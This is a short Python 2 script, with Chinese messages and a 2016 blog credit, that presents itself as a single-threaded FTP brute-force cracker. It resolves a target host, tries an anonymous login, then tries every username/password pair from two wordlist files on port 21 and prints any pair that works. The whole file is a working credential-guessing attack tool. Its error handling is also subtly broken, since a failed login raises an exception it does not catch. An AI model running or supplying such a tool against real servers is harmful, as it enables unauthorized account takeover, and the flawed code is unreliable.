#!/usr/bin/python
# -*- coding:utf-8 -*-
import socket, re, sys, time
from ftplib import FTP
socket.setdefaulttimeout(6)
def ready_check():
    print '+' + '-' * 50 + '+'
    print '\t   Python FTP暴力破解工具单线程版'
    print '\t   Blog：http://www.bigyun.top/'
    print '\t\t Code BY： lee'
    print '\t\t Time：2016-08-25'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 4:
        print "用法: ftpbrute.py 待破解的ip/domain 用户名列表 字典列表"
        sys.exit()

#匿名登录测试
def ftp_anon(host):
    try:
            print '\n[+] 测试匿名登陆……\n'
            ftp = FTP()
            ftp.connect(host, 21, 3)
            ftp.login()
            ftp.retrlines('LIST')
            ftp.quit()
            print '\n[+] 匿名登陆成功……'
    except socket.error as error:
            print '\n[-] 匿名登陆失败……'
            pass

#破解
def ftp_crack(host, user, pwd):
        try:
            ftp = FTP()
            #ftp.set_pasv(0)
            #ftp.set_debuglevel(2)
            ftp.connect(host, '21')
            ftp.login(user, pwd)
            ftp.retrlines('LIST')
            ftp.quit()
            print '\n[+] 破解成功，用户名：' + user + ' 密码：' + pwd
        except socket.error as error:
            pass

if __name__ == '__main__':
      start_time = time.time()
      ready_check()
      if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
          host = sys.argv[1]
      else:
          host = socket.gethostbyname(sys.argv[1])
      userlist = [x.rstrip() for x in open(sys.argv[2])]
      passlist = [x.rstrip() for x in open(sys.argv[3])]
      print '[+] 目标主机:', host
      print '[+] 用户列表:', len(userlist)
      print '[+] 密码列表:', len(passlist)
      ftp_anon(host)
      print '\n[+] 暴力破解中……\n'
      for user in userlist:
          print user
          for pwd in passlist:
              ftp_crack(host, user, pwd)

      print '\n[+] 破解完成，用时： %d 秒' % (time.time() - start_time)

